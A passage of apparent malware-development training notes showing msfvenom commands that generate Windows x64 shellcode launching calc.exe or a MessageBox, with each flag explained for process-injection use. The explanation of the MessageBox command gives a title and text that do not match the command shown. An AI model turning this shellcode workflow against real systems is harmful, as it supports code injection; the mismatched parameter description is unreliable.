Raw
```bash
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o calc_shellcode.bin
```

Where: 
- `-p windows/x64/exec`: Specifies the payload to use, which is a 64-bit Windows payload that executes a command.
- `CMD=calc.exe`: The command to execute, in this case launching the Windows Calculator (calc.exe).
- `EXITFUNC=thread`: Defines how the payload exits after execution. Setting it to thread ensures the payload exits cleanly by terminating the thread it runs in, rather than the entire process. This is useful for stability in injections where you donâ€™t want the target application to crash.
- `-f raw`: Specifies the output format as raw binary data, a plain sequence of bytes with no additional formatting.
- `-o calc_shellcode.bin`: Saves the generated shellcode to a file named calc_shellcode.bin.


C Format
```bash
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
```

Where:
`-f c`: Specifies the output format as a C-style array (e.g., `unsigned char buf[] = "\xFC\xE8...";`), which can be copied directly into a C program.


Raw Format with MessageBox
```bash
msfvenom -p windows/x64/messagebox TITLE="MalDev Test" TEXT="Pwn3d!" EXITFUNC=thread -f raw -o msgbox_shellcode.bin
```

Where:
- `-p windows/x64/messagebox`: Specifies the 64-bit Windows payload that displays a MessageBox using the _MessageBoxA()_ function from the Windows API.
- `TITLE="RTO: MalDev"`: Sets the title of the MessageBox to "RTO: MalDev".
- `TEXT="Hi from Red Team Operator!"`: Sets the message content of the MessageBox to "Hi from Red Team Operator!".
- `EXITFUNC=thread`: Ensures the payload exits by terminating its thread, leaving the parent process intact for stability (as explained earlier).
- `-f raw`: Outputs the shellcode as raw binary data.
- `-o msgbox_shellcode.bin`: Saves the shellcode to a file named msgbox_shellcode.bin.
